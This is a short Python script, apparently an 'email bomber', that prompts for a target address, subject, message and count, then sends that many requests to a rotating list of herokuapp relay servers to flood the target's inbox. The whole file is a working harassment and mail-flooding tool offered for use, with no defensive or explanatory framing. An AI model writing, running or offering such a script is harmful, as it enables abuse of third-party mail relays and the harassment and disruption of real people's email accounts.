import requests 
import random
to=str(input("enter target email to bomb "))
sub=str(input("enter subject "))
msg=str(input("enter message "))
msg=msg.replace(" ","%20")
sub=sub.replace(" ","%20")
# print (msg)
# print(sub)
srvrlist={1:"https://emailbomber-1.herokuapp.com",2:"https://emailbomber-2.herokuapp.com",3:"https://emailbomber-3.herokuapp.com",4:"https://emailbomber-4.herokuapp.com",5:"https://emailbomber-5.herokuapp.com",6:"https://emailbomber-6.herokuapp.com",7:"https://emailbomber-7.herokuapp.com",8:"https://emailbomber-8.herokuapp.com",9:"https://emailbomber-9.herokuapp.com",10:"https://emailbomber-10.herokuapp.com"}
am=int(input("enter amount of msgs to send"))
for i in range(0,am): 
    srvr=random.randint(1,10)
    req=requests.get(srvrlist.get(srvr)+"/bomb/"+to+"/"+sub+"/"+msg)
    if req.text=="Sent": 
        print (i+1)
    else: 
        print ("failed to send msg ")
        break